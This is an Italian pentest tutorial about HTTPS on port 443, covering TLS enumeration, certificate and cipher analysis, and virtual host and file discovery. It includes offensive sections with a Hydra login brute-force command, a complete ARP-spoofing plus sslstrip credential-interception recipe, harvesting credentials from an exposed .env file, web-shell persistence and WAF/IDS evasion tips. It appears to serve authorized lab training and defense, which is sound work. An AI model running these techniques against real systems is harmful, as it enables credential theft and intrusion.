---
title: 'Porta 443 HTTPS: Pentest, Enumerazione e Vulnerabilità TLS'
slug: porta-443-https
description: 'Che porta usa HTTPS? Porta 443 TCP e UDP: enumerazione con Nmap, testssl.sh e sslscan, certificati, cipher deboli, TLS downgrade, virtual host e hardening.'
image: /https-port-443-tcp-443-ssl-tls-pentesting.webp
draft: false
date: 2026-04-05T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - Porta 443
  - HTTPS
  - TCP 443
  - UDP 443
  - SSL/TLS
---

# Porta 443 HTTPS: Come Funziona, Enumerazione SSL/TLS e Attacchi in un Pentest

La **porta 443** è la **porta predefinita di HTTPS**: ogni sito, API, pannello di amministrazione e servizio cloud la usa per comunicare in modo cifrato. Nel pentest è quasi sempre aperta e spesso è l'unica porta raggiungibile dall'esterno, quindi è la superficie di attacco più ampia che puoi trovare su un target.

Una porta 443 aperta non vuol dire "un sito web e basta". Dietro ci sono tre livelli da testare: il **protocollo TLS** (cipher deboli, versioni obsolete, HSTS assente), il **web server** (versioni vulnerabili, virtual host nascosti) e l'**applicazione** (pannelli admin, file esposti, API senza autenticazione). Il certificato stesso rivela hostname e sottodomini che l'azienda non voleva mostrare.

Questo articolo risponde a chi cerca **che porta usa HTTPS** e a chi vuole sapere cosa fare quando la trova aperta in un test: porta 443 TCP e UDP, HTTP/3 e QUIC, enumerazione con Nmap, OpenSSL, testssl.sh e sslscan, certificati, cipher suite deboli, TLS downgrade, virtual host, file sensibili, SSL stripping, detection e hardening. Tutti i comandi sono pronti per un laboratorio autorizzato.

***

## Che porta usa HTTPS: porta 443 TCP e UDP

La porta predefinita di HTTPS è la **443/TCP**, registrata presso IANA come `https`. Se un URL inizia con `https://` e non indica nessuna porta, il browser si collega alla 443.

| Porta    | Protocollo        | Uso                                            |
| -------- | ----------------- | ---------------------------------------------- |
| 443/TCP  | HTTPS             | Web cifrato con TLS (HTTP/1.1 e HTTP/2)        |
| 443/UDP  | HTTP/3 (QUIC)     | Web cifrato su UDP, con TLS 1.3 integrato      |
| 80/TCP   | HTTP              | Web in chiaro, di solito redirect verso la 443 |
| 8443/TCP | HTTPS alternativa | Pannelli admin, Tomcat, applicazioni interne   |

HTTPS è semplicemente **HTTP dentro un tunnel TLS**. Per la parte in chiaro vedi [porta 80 HTTP](https://hackita.it/articoli/porta-80-http/).

### Porta SSL: numero di porta per i protocolli cifrati

Chi cerca la **porta SSL** o il **numero di porta per SSL** di solito intende la 443. In realtà ogni protocollo ha la sua porta cifrata:

| Servizio           | Porta | Note                                                                             |
| ------------------ | ----- | -------------------------------------------------------------------------------- |
| HTTPS              | 443   | TLS fin dall'inizio                                                              |
| LDAPS              | 636   | Vedi [porta 636 LDAPS](https://hackita.it/articoli/porta-636-ldaps/)             |
| SMTPS              | 465   | SMTP con TLS implicito                                                           |
| IMAPS              | 993   | IMAP con TLS implicito                                                           |
| POP3S              | 995   | POP3 con TLS implicito                                                           |
| FTPS (implicit)    | 990   | FTP dentro TLS                                                                   |
| Docker API con TLS | 2376  | Vedi [porta 2376 Docker SSL](https://hackita.it/articoli/porta-2376-docker-ssl/) |

Nota: oggi il nome "SSL" è un'abitudine. I protocolli SSL 2.0 e 3.0 sono obsoleti e insicuri. Quello che usi davvero è **TLS** (vedi la sezione SSL vs TLS).

***

## Come funziona HTTPS: il TLS handshake

Il flusso di una connessione HTTPS:

1. **Handshake TCP** sulla porta 443.
2. **TLS handshake:** il client invia il `ClientHello` (versioni e cipher suite supportate), il server risponde con il `ServerHello` (cipher scelta) e con il certificato.
3. **Scambio delle chiavi** e messaggio `Finished` da entrambe le parti.
4. **Richiesta HTTP** dentro il tunnel cifrato.
5. **Risposta HTTP** con status code, header e body, sempre cifrata.

Due dettagli che interessano al pentester:

* L'**SNI** (Server Name Indication) nel `ClientHello` viaggia **in chiaro** (salvo ECH). Chi sniffa la rete vede a quale hostname ti stai collegando anche se il resto è cifrato.
* In **TLS 1.3** il certificato del server viene cifrato, mentre in **TLS 1.2** viaggia in chiaro e si può leggere da una cattura di rete.

**Varianti operative:**

| Variante | Cosa cambia                                                                   |
| -------- | ----------------------------------------------------------------------------- |
| TLS 1.2  | Ancora molto diffuso, sicuro solo con cipher forti (ECDHE + AES-GCM)          |
| TLS 1.3  | Handshake più corto, solo cipher moderne, nessun downgrade verso suite deboli |
| HTTP/2   | Multiplexing sopra TLS, stessa porta 443/TCP                                  |
| HTTP/3   | QUIC su 443/UDP                                                               |
| mTLS     | Anche il client presenta un certificato (API interne, ambienti zero trust)    |

***

## TCP 443 vs UDP 443: HTTP/3 e QUIC

Quando cerchi **TCP 443** e **UDP 443** trovi due cose diverse:

* **TCP 443** è HTTPS classico (HTTP/1.1 e HTTP/2 dentro TLS).
* **UDP 443** è **HTTP/3**, che usa il protocollo **QUIC**. QUIC porta con sé TLS 1.3 e gira su UDP.

UDP 443 non è "HTTPS su UDP" in senso generico: è un trasporto diverso, con un handshake suo. Il server di solito annuncia il supporto a HTTP/3 con l'header `Alt-Svc` nella risposta HTTPS normale:

```bash
curl -skI https://10.10.10.20 | grep -i alt-svc
```

```
alt-svc: h3=":443"; ma=86400
```

Se vedi `h3=":443"`, il server accetta HTTP/3 su UDP 443. Per controllare la porta UDP con Nmap:

```bash
sudo nmap -sU -p 443 --reason 10.10.10.20
```

```
PORT    STATE         SERVICE REASON
443/udp open|filtered https   no-response
```

`open|filtered` è normale per UDP: QUIC non risponde a pacchetti non validi.

**Perché conta in un pentest:**

* Molti **WAF e IDS** ispezionano bene HTTPS su TCP ma poco QUIC, quindi UDP 443 può essere un punto cieco.
* **Burp Suite** non intercetta HTTP/3: se il browser usa QUIC la richiesta non passa dal proxy. Disattiva QUIC nel browser (in Chrome: `chrome://flags/#enable-quic`) per forzare HTTP/2 su TCP.
* Se il firewall blocca UDP 443, il browser torna da solo a TCP 443.

Per l'intercettazione vedi [Burp Suite](https://hackita.it/articoli/burp-suite/).

***

## HTTP vs HTTPS e SSL vs TLS

### HTTP vs HTTPS

| Aspetto         | HTTP (80/TCP)             | HTTPS (443/TCP)                        |
| --------------- | ------------------------- | -------------------------------------- |
| Cifratura       | Nessuna                   | TLS                                    |
| Sniffing        | Banale con tcpdump        | Vedi solo traffico cifrato e l'SNI     |
| Integrità       | Nessuna                   | Sì                                     |
| Identità server | Non verificata            | Verificata dal certificato             |
| Attacco tipico  | MitM, sniffing, injection | Misconfiguration TLS, certificati, app |

### SSL vs TLS

**SSL** è il protocollo originale (SSL 2.0 e 3.0), ormai insicuro. **TLS** è il suo successore (1.0, 1.1, 1.2, 1.3). Quando oggi si dice "certificato SSL" si intende un certificato usato con TLS. In un test, se un server accetta ancora SSLv3 o TLS 1.0 è già un finding.

***

## Enumerazione base: Nmap e certificato TLS

L'**enumerazione HTTPS** parte da due cose: il fingerprint del servizio e l'analisi del certificato. Insieme ti danno più informazioni di qualsiasi altro primo passo.

### Comando 1: Nmap

```bash
nmap -sV -sC -p 443 --script ssl-enum-ciphers,http-title,http-server-header 10.10.10.20
```

```
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Corporate Portal - Login
|_http-server-header: Apache/2.4.58 (Ubuntu)
| ssl-enum-ciphers:
|   TLSv1.2:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A
|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (ecdh_x25519) - A
|   TLSv1.3:
|     ciphers:
|       TLS_AES_256_GCM_SHA384 (ecdh_x25519) - A
|_  least strength: A
| ssl-cert:
|   Subject: commonName=portal.corp.local
|   Subject Alternative Name: DNS:portal.corp.local, DNS:admin.corp.local, DNS:api.corp.local, DNS:*.dev.corp.local
|   Issuer: commonName=Corp-CA
|   Not valid after: 2027-01-15
```

**Parametri:** `-sV` identifica web server e versione, `-sC` esegue gli script di default (incluso `ssl-cert`), `--script ssl-enum-ciphers` elenca versioni TLS e cipher suite supportate con un voto da A a F. Per approfondire Nmap vedi la [guida a Nmap](https://hackita.it/articoli/nmap/).

### Comando 2: OpenSSL per leggere il certificato

```bash
openssl s_client -connect 10.10.10.20:443 -servername portal.corp.local 2>/dev/null | openssl x509 -noout -text | grep -E "Subject:|DNS:|Issuer:|Not After"
```

```
        Issuer: CN = Corp-CA, O = Corp Inc, L = Milano
        Not After : Jan 15 12:00:00 2027 GMT
        Subject: CN = portal.corp.local
            DNS:portal.corp.local, DNS:admin.corp.local, DNS:api.corp.local, DNS:*.dev.corp.local
```

**Cosa ci dice:** il certificato rivela quattro nomi: il portale, un pannello admin, un'API e un wildcard di sviluppo. L'emittente è una CA interna (`Corp-CA`), quindi non è un servizio pubblico. Ogni hostname è un target separato da enumerare.

***

## Enumerazione avanzata

### Virtual host discovery

Il server sulla 443 può servire contenuti diversi in base all'header `Host`. Per trovare i virtual host nascosti prima prendi la dimensione della risposta di default, poi filtrala con ffuf:

```bash
curl -sk https://10.10.10.20 -o /dev/null -w "%{size_download}\n"
```

```
4242
```

```bash
ffuf -u https://10.10.10.20/ -H "Host: FUZZ.corp.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -k -fs 4242
```

```
admin                   [Status: 200, Size: 4521, Words: 312, Lines: 98]
api                     [Status: 200, Size: 89, Words: 4, Lines: 1]
jenkins                 [Status: 403, Size: 287, Words: 20, Lines: 10]
gitlab                  [Status: 302, Size: 0, Words: 1, Lines: 1]
monitoring              [Status: 401, Size: 0, Words: 1, Lines: 1]
```

**Lettura dell'output:** cinque virtual host. `jenkins` risponde 403 (esiste ma è protetto), `gitlab` fa un redirect (probabile login), `monitoring` chiede autenticazione. Ognuno è un vettore separato. Guida: [ffuf](https://hackita.it/articoli/ffuf/) e [enumeration](https://hackita.it/articoli/enumeration/).

### Directory e file discovery

```bash
ffuf -u https://portal.corp.local/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.bak,.old,.conf -k -fc 404 -t 50
```

```
login                   [Status: 200, Size: 5120, Words: 312, Lines: 120]
robots.txt              [Status: 200, Size: 54, Words: 5, Lines: 5]
api                     [Status: 301, Size: 321, Words: 20, Lines: 10]
backup                  [Status: 301, Size: 322, Words: 20, Lines: 10]
.env                    [Status: 200, Size: 612, Words: 30, Lines: 15]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
config.php.bak          [Status: 200, Size: 1840, Words: 100, Lines: 60]
```

**Lettura dell'output:** `.env` esposto (variabili d'ambiente, spesso credenziali DB e chiavi API), `config.php.bak` (backup della configurazione), `/backup/` accessibile. Ognuno è un finding critico. In alternativa puoi usare [Gobuster](https://hackita.it/articoli/gobuster/). Per i file di backup vedi [backup exposure](https://hackita.it/articoli/backup-exposure/) e [source code disclosure](https://hackita.it/articoli/source-code-disclosure/).

### Analisi SSL/TLS con testssl.sh

```bash
testssl.sh --fast --quiet https://10.10.10.20:443
```

```
 Testing protocols via sockets
 SSLv2      not offered
 SSLv3      not offered
 TLS 1      not offered
 TLS 1.1    not offered
 TLS 1.2    offered (OK)
 TLS 1.3    offered (OK)

 Testing vulnerabilities
 Heartbleed (CVE-2014-0160)       not vulnerable
 CCS (CVE-2014-0224)              not vulnerable
 Ticketbleed (CVE-2016-9244)      not vulnerable
 ROBOT                            not vulnerable
 Secure Renegotiation             supported
 CRIME, TLS (CVE-2012-4929)       not vulnerable
 BREACH (CVE-2013-3587)           potentially NOT ok, "gzip" HTTP compression detected
 POODLE, SSL                      not vulnerable
 Downgrade attack prevention      OK
 HSTS                             not offered  <<<--- FINDING
```

**Lettura dell'output:** i protocolli sono configurati bene (solo TLS 1.2 e 1.3) e non ci sono falle TLS critiche. Mancano però **HSTS** (rende possibile lo SSL stripping) e c'è la compressione HTTP, che apre a BREACH. Sono finding di configurazione, ma sono anche la porta per un [attacco man-in-the-middle](https://hackita.it/articoli/man-in-the-middle/).

### sslscan: controllo rapido di cipher e protocolli

```bash
sslscan --no-colour 10.10.10.20:443
```

```
Testing SSL server 10.10.10.20 on port 443 using SNI name 10.10.10.20

  SSL/TLS Protocols:
SSLv2     disabled
SSLv3     disabled
TLSv1.0   disabled
TLSv1.1   disabled
TLSv1.2   enabled
TLSv1.3   enabled

  TLS Fallback SCSV:
Server supports TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
Compression disabled

  Heartbleed:
TLSv1.3 not vulnerable to heartbleed
TLSv1.2 not vulnerable to heartbleed
```

`sslscan` è più veloce di testssl.sh e va bene per un primo controllo. Per i dettagli usa testssl.sh.

### Script Nmap per le vulnerabilità TLS note

```bash
nmap -p 443 --script ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-dh-params 10.10.10.20
```

Controllano Heartbleed, POODLE, la CCS injection e i parametri Diffie-Hellman deboli (Logjam).

### Analisi degli header di sicurezza

```bash
curl -skI https://portal.corp.local | grep -iE "server|x-powered|x-frame|content-security|strict-transport|x-content-type"
```

```
Server: Apache/2.4.58 (Ubuntu)
X-Powered-By: PHP/8.2.15
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: default-src 'self'
```

**Lettura dell'output:** mancano `Strict-Transport-Security` (HSTS) e `X-Content-Type-Options`. `X-Powered-By` rivela PHP 8.2.15, versione da controllare per CVE note. `Server` conferma Apache 2.4.58 su Ubuntu.

***

## Certificati SSL e cipher suite deboli: cosa cercare

La **SSL/TLS vulnerability** più comune non è un exploit ma una configurazione sbagliata. Ecco cosa cercare e come verificarlo:

| Problema                            | Impatto                                          | Come lo verifichi                                |
| ----------------------------------- | ------------------------------------------------ | ------------------------------------------------ |
| SSLv3, TLS 1.0 o 1.1 attivi         | Downgrade, POODLE, BEAST                         | `nmap --script ssl-enum-ciphers -p 443 <target>` |
| Cipher deboli (RC4, 3DES, export)   | Decifratura del traffico (Sweet32, FREAK)        | `testssl.sh --fast https://<target>`             |
| Diffie-Hellman debole               | Logjam                                           | `nmap --script ssl-dh-params -p 443 <target>`    |
| Certificato scaduto o self-signed   | Nessuna garanzia sull'identità del server        | `openssl s_client -connect <target>:443`         |
| SAN con hostname interni            | Information disclosure su infrastruttura         | `openssl x509 -noout -text \| grep DNS:`         |
| HSTS assente                        | SSL stripping                                    | `curl -skI https://<target> \| grep -i strict`   |
| Compressione HTTP/TLS               | BREACH, CRIME                                    | `testssl.sh`                                     |
| Heartbleed (OpenSSL 1.0.1 - 1.0.1f) | Lettura memoria del server, anche chiavi private | `nmap --script ssl-heartbleed -p 443 <target>`   |

### Vulnerabilità TLS note da riconoscere

| Nome       | Cosa sfrutta                              | Condizione                        |
| ---------- | ----------------------------------------- | --------------------------------- |
| Heartbleed | Bug nell'estensione heartbeat di OpenSSL  | OpenSSL 1.0.1 - 1.0.1f            |
| POODLE     | Padding oracle su SSLv3 con CBC           | SSLv3 abilitato                   |
| BEAST      | Debolezza CBC in TLS 1.0                  | TLS 1.0 abilitato                 |
| CRIME      | Compressione TLS                          | Compressione TLS attiva           |
| BREACH     | Compressione HTTP                         | Compressione gzip + dati riflessi |
| FREAK      | Cipher RSA "export" deboli                | Cipher export abilitate           |
| Logjam     | Diffie-Hellman con parametri deboli       | DH a 512 o 1024 bit               |
| Sweet32    | Collisioni su cifrari a blocchi da 64 bit | 3DES abilitato                    |
| ROBOT      | Oracle su RSA PKCS#1 v1.5                 | Scambio chiavi RSA abilitato      |

### TLS downgrade

Un **TLS downgrade attack** costringe client e server a negoziare una versione o una cipher più debole. Funziona solo se il server accetta ancora versioni obsolete. Per verificare se accetta TLS 1.0:

```bash
openssl s_client -connect 10.10.10.20:443 -tls1
```

Se la connessione si apre e vedi `Protocol: TLSv1`, il server è vulnerabile al downgrade. Se vedi un errore `handshake failure` o `no protocols available`, TLS 1.0 è disabilitato.

***

## Tecniche offensive

### Brute force su login form

**Contesto:** pannello di login su HTTPS senza rate limiting né CAPTCHA, comune su applicazioni interne.

```bash
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt portal.corp.local https-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials" -t 4
```

```
[443][http-post-form] host: portal.corp.local   login: admin   password: admin123
1 of 1 target successfully completed, 1 valid password found
```

**Parametri:** `https-post-form` indica un form POST su HTTPS, `^USER^` e `^PASS^` sono i segnaposto, `F=Invalid credentials` è la stringa che compare quando il login **fallisce**. Se la pagina di errore ha lo stesso status code del successo, usa una stringa di match precisa.

**Cosa fai dopo:** accedi come admin e mappa le funzioni: upload file, gestione utenti, configurazione. Cerca vettori per RCE (file upload, template injection, command injection). Guida: [Hydra](https://hackita.it/articoli/hydra/) e [file upload attack](https://hackita.it/articoli/file-upload-attack/).

### SSL stripping (MitM senza HSTS)

**Contesto:** il target non ha HSTS e sei in posizione di MitM sulla stessa rete (laboratorio). Lo SSL stripping intercetta la richiesta HTTP iniziale e impedisce l'upgrade a HTTPS.

```bash
# Enable IP forwarding so the victim keeps working
sudo sysctl -w net.ipv4.ip_forward=1

# Terminal 1: ARP spoofing between victim and gateway
sudo arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

# Terminal 2: redirect HTTP traffic to sslstrip
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Terminal 3: run sslstrip
sudo sslstrip -l 8080
```

Le credenziali intercettate finiscono nel log:

```bash
grep -i "SECURE POST" sslstrip.log
```

```
2026-11-01 16:40:11,204 SECURE POST Data (portal.corp.local):
username=admin&password=S3cretP4ss!
```

**Quando fallisce:** se il sito ha HSTS (o è nella HSTS preload list del browser), il client si collega direttamente in HTTPS e lo stripping non funziona. È il motivo per cui HSTS è la difesa principale. Vedi [man-in-the-middle](https://hackita.it/articoli/man-in-the-middle/) e [session hijacking](https://hackita.it/articoli/session-hijacking/).

### File .env e configurazioni esposte

**Contesto:** `.env` o un backup di configurazione raggiungibili senza autenticazione sulla 443.

```bash
curl -sk https://portal.corp.local/.env
```

```
APP_NAME=CorporatePortal
APP_ENV=production
APP_KEY=base64:yK3s8mN2pL...
DB_HOST=10.10.10.50
DB_DATABASE=portal_prod
DB_USERNAME=portal_db
DB_PASSWORD=Pr0d_DB!2026
MAIL_HOST=smtp.corp.local
MAIL_USERNAME=noreply@corp.local
MAIL_PASSWORD=MailP4ss!
REDIS_HOST=10.10.10.51
```

**Cosa fai dopo:** hai credenziali del database, della posta e l'indirizzo di Redis. Verifica che funzionino (`mysql -h 10.10.10.50 -u portal_db -p`) e controlla se le password sono riusate su altri servizi. Per il passo successivo vedi [pivoting](https://hackita.it/articoli/pivoting/).

Altri file da provare sempre:

```bash
curl -sk https://portal.corp.local/.git/HEAD
curl -sk https://portal.corp.local/web.config
curl -sk https://portal.corp.local/phpinfo.php | head
```

Se `.git/HEAD` risponde con `ref: refs/heads/main`, il repository è esposto e puoi scaricare il codice sorgente.

### Virtual host routing: accesso ai pannelli non pubblici

**Contesto:** un virtual host non pubblico risponde solo se l'header `Host` è corretto.

```bash
curl -sk https://10.10.10.20 -H "Host: admin.corp.local"
```

```
<!DOCTYPE html>
<html>
<head><title>Admin Panel - Corp</title></head>
<body>
<h1>System Administration</h1>
<form action="/admin/login" method="POST">
```

**Cosa fai dopo:** hai trovato il pannello admin. Prova le credenziali di default, il brute force con Hydra o le vulnerabilità del framework usato.

### Dalla 443 ad altre vulnerabilità web

Quando l'applicazione è raggiungibile, la 443 diventa il punto di partenza per tutto il web hacking: [SQL injection](https://hackita.it/articoli/sql-injection/), [XSS](https://hackita.it/articoli/xss/), [SSRF](https://hackita.it/articoli/ssrf/), [LFI](https://hackita.it/articoli/lfi/), [CORS misconfiguration](https://hackita.it/articoli/cors-misconfiguration/). Per le API vedi la [guida agli attacchi alle API moderne](https://hackita.it/articoli/api-modern-web-attacks-guida-completa/).

***

## Tre scenari pratici da lab e CTF

### Scenario 1: azienda con dominio pubblico e Certificate Transparency

**Situazione:** il target ha il dominio pubblico `corp.com` e devi enumerare le applicazioni HTTPS esposte.

**Step 1:** i certificati emessi sono pubblici. Estrai i sottodomini da crt.sh:

```bash
curl -s "https://crt.sh/?q=%25.corp.com&output=json" | jq -r '.[].name_value' | sed 's/^\*\.//' | sort -u > subdomains.txt
cat subdomains.txt
```

```
admin.corp.com
api.corp.com
corp.com
dev.corp.com
jenkins.corp.com
mail.corp.com
staging.corp.com
vpn.corp.com
www.corp.com
```

**Step 2:** controlla quali rispondono su HTTPS. Con [httpx](https://hackita.it/articoli/httpx/) è immediato:

```bash
httpx -l subdomains.txt -sc -title -tech-detect -silent
```

```
https://admin.corp.com [401] [Restricted Area]
https://api.corp.com [200] [API Gateway] [Nginx]
https://jenkins.corp.com [403] [Forbidden]
https://staging.corp.com [200] [Staging - Corp] [PHP,Apache]
https://vpn.corp.com [200] [SSL VPN Login]
```

Se non hai httpx, lo stesso controllo con curl:

```bash
while read host; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$host" --connect-timeout 3)
  echo "$host : $code"
done < subdomains.txt
```

**Se fallisce:** i sottodomini sono interni e il DNS pubblico non li risolve. Aggiungili a `/etc/hosts` con l'IP del target: `echo "1.2.3.4 admin.corp.com" | sudo tee -a /etc/hosts`.

Per l'enumerazione dei sottodomini in modo più ampio vedi [Amass](https://hackita.it/articoli/amass/) e [subdomain takeover](https://hackita.it/articoli/subdomain-takeover/).

### Scenario 2: lab con Apache e PHP vulnerabile

**Situazione:** macchina CTF con applicazione PHP sulla 443, stack LAMP classico con configurazioni sbagliate.

```bash
nikto -h https://10.10.10.20 -ssl 2>/dev/null | head -30
```

```
+ Server: Apache/2.4.58 (Ubuntu)
+ /: The X-Content-Type-Options header is not set.
+ /config.php.bak: PHP config backup found.
+ /.env: Environment file found.
+ /phpinfo.php: PHP info file found.
+ /server-status: Apache server-status found (403).
```

```bash
curl -sk https://10.10.10.20/phpinfo.php | grep -E "DOCUMENT_ROOT|SERVER_SOFTWARE|disable_functions"
```

```
DOCUMENT_ROOT: /var/www/html
SERVER_SOFTWARE: Apache/2.4.58
disable_functions: no value
```

`disable_functions` vuoto significa che funzioni come `system()` non sono bloccate: se trovi un modo per eseguire PHP (upload, LFI), l'RCE è diretta. Se `phpinfo.php` non esiste prova `/info.php`, `/test.php`. Vedi [web shell](https://hackita.it/articoli/web-shell/).

### Scenario 3: API senza autenticazione con Swagger pubblico

**Situazione:** API REST su HTTPS con documentazione OpenAPI accessibile a tutti.

```bash
curl -sk https://api.corp.com/swagger.json | jq '.paths | keys[]'
```

```
"/api/v1/users"
"/api/v1/users/{id}"
"/api/v1/admin/config"
"/api/v1/admin/backup"
"/api/v1/auth/login"
"/api/v1/files/upload"
```

```bash
curl -sk https://api.corp.com/api/v1/users | jq '.[0:3]'
```

```json
[
  {"id": 1, "username": "admin", "email": "admin@corp.com", "role": "administrator"},
  {"id": 2, "username": "jsmith", "email": "jsmith@corp.com", "role": "user"},
  {"id": 3, "username": "svc_api", "email": "api@corp.com", "role": "service"}
]
```

L'endpoint `/users` risponde senza token: è una falla di controllo accessi. Se invece chiede un token Bearer, controlla se ce n'è uno hardcoded nella documentazione e prova `/auth/login` con credenziali di default. Approfondisci in [API modern web attacks](https://hackita.it/articoli/api-modern-web-attacks-guida-completa/) e [GraphQL exploitation](https://hackita.it/articoli/graphql-exploitation/).

***

## Attack chain completa

```
Recon (certificate + subdomain enum) → Service fingerprint → TLS audit → Directory/file discovery → Credential harvest (.env, config) → Initial access (login/exploit) → Lateral movement (DB, internal services) → Persistence (web shell)
```

| Fase               | Tool             | Comando chiave                                                    | Risultato                          |
| ------------------ | ---------------- | ----------------------------------------------------------------- | ---------------------------------- |
| Recon              | crt.sh / openssl | `curl "https://crt.sh/?q=%25.corp.com&output=json"`               | Sottodomini da certificati         |
| Fingerprint        | nmap / httpx     | `nmap -sV --script ssl-enum-ciphers -p 443`                       | Web server, TLS, cipher            |
| TLS audit          | testssl.sh       | `testssl.sh --fast https://<target>`                              | HSTS, cipher, vulnerabilità        |
| Discovery          | ffuf             | `ffuf -u https://<target>/FUZZ -w raft-medium-directories.txt -k` | File sensibili, directory          |
| Credential harvest | curl             | `curl -sk https://<target>/.env`                                  | Credenziali DB, API key            |
| Initial access     | hydra / Burp     | `hydra ... https-post-form`                                       | Login valido                       |
| Lateral movement   | mysql / ssh      | `mysql -h <db_host> -u <user> -p`                                 | Accesso al DB con credenziali .env |
| Persistence        | web shell        | Upload via file upload                                            | Accesso persistente                |

**Tempo stimato:** 30-120 minuti. La fase più variabile è la discovery, che dipende dal numero di virtual host e dalla dimensione dell'applicazione. Per i passi finali vedi [post-exploitation](https://hackita.it/articoli/post-exploitation/).

**Ruolo della 443:** in un pentest esterno è spesso l'unica porta raggiungibile attraverso il firewall, quindi tutta la catena parte da lì.

***

## Detection e evasion

### Cosa monitora il Blue Team

* **Log del WAF** (ModSecurity, Cloudflare, AWS WAF): regole contro traversal, SQL injection, XSS.
* **Access log del web server:** `/var/log/apache2/access.log` (Apache), `/var/log/nginx/access.log` (Nginx).
* **IDS/IPS:** regole Suricata sui pattern offensivi, ma richiedono TLS inspection per vedere dentro HTTPS.
* **SIEM:** allarmi su molti 404 (directory brute force), molti 401 (credential brute force), user-agent anomali e connessioni HTTP/3 non ispezionate.
* **Certificate Transparency:** monitorare i certificati emessi per il proprio dominio individua sottodomini dimenticati o emessi senza autorizzazione.

### Tecniche di evasion (Red Team)

**1. User-Agent realistico.** I tool hanno user-agent riconoscibili:

```bash
ffuf -u https://portal.corp.local/FUZZ -w raft-medium-directories.txt -k -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
```

**2. Rate limiting volontario.** Le WAF cloud hanno soglie tipiche di centinaia di richieste al minuto. Resta sotto:

```bash
ffuf -u https://portal.corp.local/FUZZ -w raft-medium-directories.txt -k -rate 5 -t 5
```

`-rate 5` limita a 5 richieste al secondo, `-t 5` usa 5 thread.

**3. Rotazione IP.** Distribuire le richieste su più IP (proxy, VPS) rende più difficile la correlazione.

**4. Evitare wordlist rumorose.** Path come `/admin/` o `/wp-login.php` su un sito che non è WordPress sono subito riconosciuti dalle WAF.

### Cleanup

* Se hai caricato una web shell, rimuovila.
* Se hai modificato file di configurazione, ripristina gli originali.
* I log del web server contengono ogni tua richiesta con IP e timestamp: senza accesso root non puoi cancellarli, e in un test reale non si cancellano comunque. Si documenta tutto nel report.

***

## Toolchain e confronto

### Pipeline operativa

```
nmap / openssl (fingerprint) → crt.sh / amass (subdomain) → ffuf / gobuster (discovery) → nikto / testssl.sh / sslscan (vuln scan) → hydra / Burp (exploit) → curl (data extraction) → web shell (persistence)
```

Dati che passano da una fase all'altra: hostname dal certificato, sottodomini, virtual host, path sensibili, credenziali da `.env`, versioni software per la ricerca di CVE.

### Confronto strumenti TLS

| Tool       | Velocità | Dettaglio | Uso                                       |
| ---------- | -------- | --------- | ----------------------------------------- |
| Nmap (NSE) | Media    | Medio     | Cipher, certificato, Heartbleed, POODLE   |
| OpenSSL    | Alta     | Basso     | Certificato, test manuale di una versione |
| sslscan    | Alta     | Medio     | Primo controllo rapido                    |
| testssl.sh | Media    | Alto      | Audit completo con vulnerabilità e HSTS   |

### HTTPS, HTTP e HTTP/3 a confronto

| Aspetto         | HTTPS (443/TCP)                | HTTP (80/TCP)      | HTTP/3 (443/UDP)           |
| --------------- | ------------------------------ | ------------------ | -------------------------- |
| Cifratura       | TLS                            | Nessuna            | QUIC (TLS 1.3 integrato)   |
| Intercettazione | Richiede MitM o TLS inspection | Banale con tcpdump | Complessa                  |
| Header visibili | Solo dopo l'handshake TLS      | Subito             | Solo dopo l'handshake QUIC |
| WAF bypass      | Più difficile                  | Più facile         | Spesso poco ispezionato    |
| Quando testarlo | Qualsiasi web pentest moderno  | Legacy e redirect  | Target con CDN o Google    |

***

## Troubleshooting

| Errore / Sintomo                              | Causa                                                | Fix                                                                      |
| --------------------------------------------- | ---------------------------------------------------- | ------------------------------------------------------------------------ |
| `SSL certificate problem: self signed`        | Certificato self-signed o CA interna                 | Usa `-k` con curl e ffuf                                                 |
| `Connection reset` dopo il TLS handshake      | SNI mancante o sbagliato                             | Usa `-servername <hostname>` con openssl o `-H "Host: <vhost>"` con curl |
| ffuf restituisce solo 403                     | La WAF blocca lo user-agent del tool                 | Aggiungi `-H "User-Agent: Mozilla/5.0 ..."`                              |
| `curl: (35) SSL routines`                     | Cipher o versione TLS non supportata dal client      | Forza la cipher: `curl --ciphers 'ECDHE-RSA-AES256-GCM-SHA384' ...`      |
| Nmap `ssl-enum-ciphers` senza risultati       | Il server richiede SNI                               | Usa `--script-args tls.servername=<hostname>`                            |
| Hydra segnala falsi positivi                  | La pagina di errore ha lo stesso status del successo | Usa una stringa di match precisa: `F=Invalid` o `S=Welcome`              |
| `openssl s_client -tls1` dà errore sul client | OpenSSL moderno ha disabilitato TLS 1.0 in locale    | Usa testssl.sh, che testa i protocolli con socket proprie                |
| Burp non vede il traffico del browser         | Il browser usa HTTP/3 su UDP 443                     | Disattiva QUIC nel browser                                               |

***

## FAQ

**Che porta usa HTTPS?**
La **443/TCP**. HTTP/3 usa anche la **443/UDP**.

**Qual è la porta predefinita di HTTPS e qual è la porta SSL?**
La porta predefinita di HTTPS è la 443. Per "porta SSL" di solito si intende la stessa 443, ma i protocolli cifrati hanno porte proprie (LDAPS 636, IMAPS 993, SMTPS 465).

**Che differenza c'è tra TCP 443 e UDP 443?**
TCP 443 è HTTPS classico (HTTP/1.1 e HTTP/2). UDP 443 è HTTP/3 sopra QUIC.

**Come enumero i sottodomini dalla porta 443?**
